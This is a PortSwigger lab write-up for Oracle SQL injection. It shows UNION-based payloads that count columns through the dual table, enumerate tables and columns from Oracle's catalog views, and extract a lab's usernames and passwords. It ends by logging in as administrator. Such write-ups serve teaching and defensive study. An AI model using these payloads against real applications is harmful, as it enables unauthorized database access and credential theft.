# SQL injection attack, listing the database contents on Oracle

## Introduction

Welcome to my another writeup! In this Portswigger Labs [lab](https://portswigger.net/web-security/sql-injection/examining-the-database/lab-listing-database-contents-oracle), you'll learn: SQL injection attack, listing the database contents on Oracle! Without further ado, let's dive in.

- Overall difficulty for me (From 1-10 stars): ★☆☆☆☆☆☆☆☆☆

## Background

This lab contains an [SQL injection](https://portswigger.net/web-security/sql-injection) vulnerability in the product category filter. The results from the query are returned in the application's response so you can use a UNION attack to retrieve data from other tables.

The application has a login function, and the database contains a table that holds usernames and passwords. You need to determine the name of this table and the columns it contains, then retrieve the contents of the table to obtain the username and password of all users.

To solve the lab, log in as the `administrator` user.

## Exploitation

**Home page:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/SQL-Injection/SQLi-10/images/Pasted%20image%2020221205070955.png)

**In the previous labs, we found an SQL injection vulnerability in the product category filter:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/SQL-Injection/SQLi-10/images/Pasted%20image%2020221205071046.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/SQL-Injection/SQLi-10/images/Pasted%20image%2020221205071100.png)

And we can confirm that **this table has 2 columns.**

**However, when we use the `UNION` clause, it outputs an `500 Internal Server Error` HTTP status:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/SQL-Injection/SQLi-10/images/Pasted%20image%2020221205071326.png)

In the [7th lab](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/SQL-Injection/SQLi-7/README.md), we found that **Oracle database must have `FROM` clause in `SELECT` statement.**

**To solve this error, we can use the `dual` in-memory table exploit the SQL injection vulnerbility in the product category filter.**
```sql
' UNION SELECT NULL,NULL FROM dual-- -
```

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/SQL-Injection/SQLi-10/images/Pasted%20image%2020221205071426.png)

**Next, we need to find which column accepts string data type:**
```sql
' UNION SELECT 'string1','string2' FROM dual-- -
```

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/SQL-Injection/SQLi-10/images/Pasted%20image%2020221205071514.png)

Both columns are accepting string data type.

**To extract the credentials of the `administrator` user password, I'll:**

- Find all tables that's related to `user`:

```sql
' UNION SELECT NULL,table_name FROM all_tables WHERE table_name LIKE '%user%'-- -
```

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/SQL-Injection/SQLi-10/images/Pasted%20image%2020221205071908.png)

The table `USERS_GCZDLS` looks sussy, let's list all columns from that table.

- Listing all columns from table `USERS_GCZDLS`:

```sql
' UNION SELECT NULL,column_name FROM all_tab_columns WHERE table_name='USERS_GCZDLS'-- -
```

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/SQL-Injection/SQLi-10/images/Pasted%20image%2020221205072106.png)

Table `USERS_GCZDLS` columns: `PASSWORD_BGCXGZ`, `USERNAME_SVWHIB`

Then, we can extract all the data from that table.

- Extracting data from table `USERS_GCZDLS`:

```sql
' UNION SELECT NULL,USERNAME_SVWHIB||':'||PASSWORD_BGCXGZ FROM USERS_GCZDLS-- -
```

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/SQL-Injection/SQLi-10/images/Pasted%20image%2020221205072242.png)

Found `administrator` password!

- Username: administrator
- Password: nrywnjxq5v4lj96pzwtn

**Let's login as `administrator`:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/SQL-Injection/SQLi-10/images/Pasted%20image%2020221205072332.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/SQL-Injection/SQLi-10/images/Pasted%20image%2020221205072343.png)

We're user `administrator`!!

# What we've learned:

1. SQL injection attack, listing the database contents on Oracle